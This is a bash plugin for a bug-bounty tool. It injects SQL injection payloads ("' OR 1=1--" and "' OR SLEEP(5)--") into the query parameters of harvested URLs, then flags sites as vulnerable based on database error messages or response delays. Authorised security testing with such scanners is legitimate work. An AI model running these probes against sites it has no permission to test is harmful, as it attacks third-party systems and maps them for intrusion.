#!/bin/bash
# BBHunter SQL Injection Scanner

PLUGIN_NAME="SQLi Scanner"
PLUGIN_VERSION="2.4"
PLUGIN_AUTHOR="BBHunter Team by kdairatchi"
PLUGIN_DESCRIPTION="Advanced SQL injection detection with error-based and time-based checks"
PLUGIN_CATEGORY="vulnerability"

run_sqli_scan() {
    local input_dir="$1"
    local output_dir="$2"
    mkdir -p "$output_dir/plugins/sqli_scan"
    
    local output_file="$output_dir/plugins/sqli_scan/results.txt"
    local json_file="$output_dir/plugins/sqli_scan/results.json"
    local vulnerable=0

    echo "[" > "$json_file"
    first_entry=true

    while read -r url; do
        echo -e "${CYAN}[>] Testing: $url${NC}"
        
        # Test for error-based SQLi
        test_url=$(echo "$url" | qsreplace "' OR 1=1--")
        response=$(curl -s "$test_url")
        
        if echo "$response" | grep -qi "SQL syntax\|MySQL\|PostgreSQL\|ORA-"; then
            if [ "$first_entry" = false ]; then
                echo "," >> "$json_file"
            fi
            first_entry=false
            
            cat >> "$json_file" <<EOF
    {
        "url": "$url",
        "type": "Error-based SQLi",
        "payload": "' OR 1=1--",
        "timestamp": "$(date +"%Y-%m-%d %H:%M:%S")"
    }
EOF
            echo "Vulnerable: $url" >> "$output_file"
            echo "Type: Error-based" >> "$output_file"
            echo "Payload: ' OR 1=1--" >> "$output_file"
            ((vulnerable++))
        fi

        # Test for time-based SQLi
        start_time=$(date +%s)
        test_url=$(echo "$url" | qsreplace "' OR SLEEP(5)--")
        curl -s "$test_url" >/dev/null
        end_time=$(date +%s)
        
        if (( end_time - start_time >= 5 )); then
            if [ "$first_entry" = false ]; then
                echo "," >> "$json_file"
            fi
            first_entry=false
            
            cat >> "$json_file" <<EOF
    {
        "url": "$url",
        "type": "Time-based SQLi",
        "payload": "' OR SLEEP(5)--",
        "timestamp": "$(date +"%Y-%m-%d %H:%M:%S")"
    }
EOF
            echo "Vulnerable: $url" >> "$output_file"
            echo "Type: Time-based" >> "$output_file"
            echo "Payload: ' OR SLEEP(5)--" >> "$output_file"
            ((vulnerable++))
        fi

    done < "$input_dir/recon/urls_with_params.txt"

    echo "]" >> "$json_file"
    return $vulnerable
}

register_plugin() {
    echo "{
        \"name\": \"$PLUGIN_NAME\",
        \"version\": \"$PLUGIN_VERSION\",
        \"author\": \"$PLUGIN_AUTHOR\",
        \"description\": \"$PLUGIN_DESCRIPTION\",
        \"category\": \"$PLUGIN_CATEGORY\",
        \"run_function\": \"run_sqli_scan\"
    }"
}
